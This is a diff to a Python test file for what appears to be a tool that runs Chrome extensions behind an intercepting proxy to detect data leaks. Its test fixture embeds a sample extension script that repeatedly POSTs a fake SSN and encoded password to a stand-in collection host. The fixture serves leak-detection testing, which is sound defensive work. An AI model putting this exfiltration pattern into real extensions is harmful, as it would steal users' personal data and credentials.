@@ -27,6 +27,7 @@ OPENSSL = shutil.which("openssl")
 READY = mitm.find("mitmweb") and browser.find_cft() and OPENSSL
 
 BACKGROUND = """
+console.log("dyn-run-test service worker started");
 const send = () => fetch("http://dyn-run-test.test/collect", {method: "POST",
   body: JSON.stringify({ssn: "900-12-3456", pw: btoa("Pollen!Test2048")})}).catch(() => {});
 send(); setInterval(send, 700);
@@ -72,8 +73,8 @@ class TestRun(unittest.TestCase):
         return d, meta, hits
 
     def test_full_extension_run(self):
-        # setup: Enter | active: "summarize", Enter, "done" | notes: Enter
-        d, meta, hits = self.go(str(self.crx), ["", "summarize", "", "done", ""])
+        # setup: Enter | passive clicks: Enter | active: "summarize", Enter, "done" | notes: Enter
+        d, meta, hits = self.go(str(self.crx), ["", "", "summarize", "", "done", ""])
         self.assertEqual(meta["phases"], ["setup", "baseline", "passive", "active:summarize", "notes", "finished"])
         self.assertEqual(meta["extension"]["ext_id"], self.ext_id)
         self.assertTrue(meta["id_confirmed"], "Chrome did not load the extension under its real ID")
@@ -89,13 +90,20 @@ class TestRun(unittest.TestCase):
         phases = [json.loads(l)["phase"] for l in (d / "phases.jsonl").read_text().splitlines()]
         self.assertEqual(phases, meta["phases"])
         self.assertTrue((d / "notes.md").exists() and (d / "profile").is_dir())
+        # console messages are recorded, labelled with their source
+        self.assertIn("dyn-run-test service worker started", (d / "chrome.log").read_text(errors="replace"))
+        # the seeded preferences survived Chrome rewriting its Preferences file
+        prefs = json.loads((d / "profile" / "Default" / "Preferences").read_text())
+        self.assertIs(prefs["search"]["suggest_enabled"], False)
+        aep = prefs["alternate_error_pages"]           # Chrome 131 migrates "enabled" to "backup"
+        self.assertIs(aep.get("enabled", aep.get("backup")), False)
         # the real run folder feeds summarize directly
         (row,) = summarize([d], self.tmp / "results")["runs"]
         self.assertEqual((row["leak"], row["id_confirmed"], row["leak_from_extension_origin"]), ("Y", "Y", "Y"))
         self.assertIn("ssn", row["leak_fields"])
 
     def test_ctrl_c_still_saves_a_closed_out_run(self):
-        d, meta, _ = self.go("control", ["\x04"], discard_profile=True)    # EOF/Ctrl-C at the notes prompt
+        d, meta, _ = self.go("control", ["", "\x04"], discard_profile=True)  # passive: Enter; Ctrl-C at notes
         self.assertTrue(meta["aborted"])
         self.assertEqual(meta["phases"], ["startup", "baseline", "passive", "notes", "finished"])
         self.assertIsNotNone(meta["ended"])
@@ -106,3 +114,35 @@ class TestRun(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class TestSeedProfile(unittest.TestCase):
+    def test_only_seeds_a_new_profile(self):
+        tmp = Path(tempfile.mkdtemp())
+        try:
+            browser.seed_profile(tmp)
+            prefs = tmp / "Default" / "Preferences"
+            self.assertEqual(json.loads(prefs.read_text()), browser.PROFILE_PREFS)
+            prefs.write_text('{"kept": true}')
+            browser.seed_profile(tmp)                       # existing profile: left alone
+            self.assertEqual(json.loads(prefs.read_text()), {"kept": True})
+        finally:
+            shutil.rmtree(tmp)
+
+
+class TestOpenUrl(unittest.TestCase):
+    """Opening a page launches Chrome a second time; it must carry the same protective flags."""
+
+    def test_second_launch_has_same_flags_but_no_extension(self):
+        from unittest import mock
+        r = runmod.Run.__new__(runmod.Run)
+        r.o = runmod.RunOptions("x", "session", proxy_port=8080)
+        r.chrome, r.profile, r.spki = Path("/chrome"), Path("/p"), "HASH"
+        with mock.patch.object(runmod.subprocess, "Popen") as popen:
+            r.open_url("https://example.com/")
+        args = popen.call_args[0][0]
+        for flag in ("--use-mock-keychain", "--no-first-run", "--user-data-dir=/p", "--proxy-server=127.0.0.1:8080",
+                     "--ignore-certificate-errors-spki-list=HASH"):
+            self.assertIn(flag, args)
+        self.assertFalse([a for a in args if a.startswith("--load-extension")])
+        self.assertEqual(args[-1], "https://example.com/")
